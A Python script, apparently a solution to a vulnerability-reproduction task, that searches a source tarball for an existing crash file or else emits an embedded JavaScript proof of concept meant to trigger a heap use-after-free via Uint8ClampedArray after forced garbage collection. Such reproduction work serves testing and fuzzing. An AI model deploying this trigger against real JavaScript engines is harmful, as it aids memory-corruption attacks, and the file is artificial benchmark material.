import os
import tarfile
from typing import Optional


class Solution:
    def solve(self, src_path: str) -> bytes:
        existing = self._try_find_poc(src_path)
        if existing is not None:
            return existing
        return self._generate_default_poc()

    def _try_find_poc(self, src_path: str) -> Optional[bytes]:
        try:
            if tarfile.is_tarfile(src_path):
                with tarfile.open(src_path, "r:*") as tf:
                    candidates = []
                    for m in tf.getmembers():
                        if not m.isfile():
                            continue
                        name_lower = m.name.lower()
                        if not (name_lower.endswith(".js") or name_lower.endswith(".mjs") or name_lower.endswith(".html") or name_lower.endswith(".htm")):
                            continue
                        score = 0
                        if any(k in name_lower for k in ("poc", "crash", "uaf", "use-after-free", "heap")):
                            score += 5
                        f = tf.extractfile(m)
                        if not f:
                            continue
                        try:
                            content = f.read(2_000_000)
                        except Exception:
                            continue
                        cl = content.lower()
                        if b"uint8clampedarray" in cl:
                            score += 8
                        if b"use after free" in cl or b"use-after-free" in cl or b"heap-use-after-free" in cl:
                            score += 3
                        candidates.append((score, content))
                    if candidates:
                        candidates.sort(key=lambda x: -x[0])
                        top_score, top_content = candidates[0]
                        if top_score > 0:
                            return top_content
        except Exception:
            pass
        return None

    def _generate_default_poc(self) -> bytes:
        js = r"""
// PoC: Heap Use-After-Free via Uint8ClampedArray not retaining ArrayBuffer roots
(function () {
    "use strict";

    function forceGC() {
        if (typeof gc === 'function') {
            // Multiple cycles to increase likelihood of collecting detached buffers
            for (let i = 0; i < 30; ++i) {
                try { gc(); } catch (e) {}
            }
        } else {
            // Fallback: create memory pressure
            let junk = [];
            try {
                for (let i = 0; i < 64; ++i) {
                    junk.push(new ArrayBuffer(1 << 20)); // 1 MiB each
                }
            } catch (e) {}
            junk = null;
        }
    }

    function writeAcross(ta, sizeHint) {
        // Try to write across the buffer without relying only on .length
        let size = 0;
        try { size = ta.length|0; } catch (e) {}
        if (!size) {
            try { size = ta.byteLength|0; } catch (e) {}
        }
        if (!size) size = sizeHint|0;
        if (!size) size = 1 << 20;

        let step = 4096;
        for (let i = 0; i < size; i += step) {
            try { ta[i] = 0x7f; } catch (e) { break; }
        }
        // Also do a few dense writes near the start to ensure actual access happens
        for (let i = 0; i < 1024 && i < size; ++i) {
            try { ta[i] = i & 0xff; } catch (e) { break; }
        }
    }

    function readAcross(ta, sizeHint) {
        let size = 0;
        try { size = ta.length|0; } catch (e) {}
        if (!size) {
            try { size = ta.byteLength|0; } catch (e) {}
        }
        if (!size) size = sizeHint|0;
        if (!size) size = 1 << 20;

        let acc = 0;
        let step = 8192;
        for (let i = 0; i < size; i += step) {
            try { acc ^= (ta[i] | 0); } catch (e) { break; }
        }
        return acc;
    }

    // Ensure the constructor is present; if not, let this throw to indicate mismatch
    if (typeof Uint8ClampedArray !== "function")
        throw new Error("Uint8ClampedArray missing");

    // Create an explicit backing ArrayBuffer so that the only intended strong reference is from the typed array view.
    let buf = new ArrayBuffer(1 << 20); // 1 MiB
    let ta = new Uint8ClampedArray(buf);
    // Remove extra reference to the buffer
    buf = null;

    // Touch the buffer to ensure it is materialized
    ta[0] = 0x41;

    // Force collection; in the vulnerable build, the ArrayBuffer may be collected even though 'ta' still exists.
    forceGC();

    // Perform many writes and reads after GC to trigger heap-use-after-free if the buffer was freed.
    writeAcross(ta, 1 << 20);
    let x = readAcross(ta, 1 << 20);

    // Keep 'ta' alive to avoid DCE; do something with x to avoid constant folding
    if (x === -1) {
        // This branch won't be taken; avoid calling unknown globals.
        // The presence of this branch keeps the value observable.
        for (let i = 0; i < 10; ++i) { ta[i] = (ta[i] + 1) & 0xff; }
    }
})();
"""
        return js.encode("utf-8")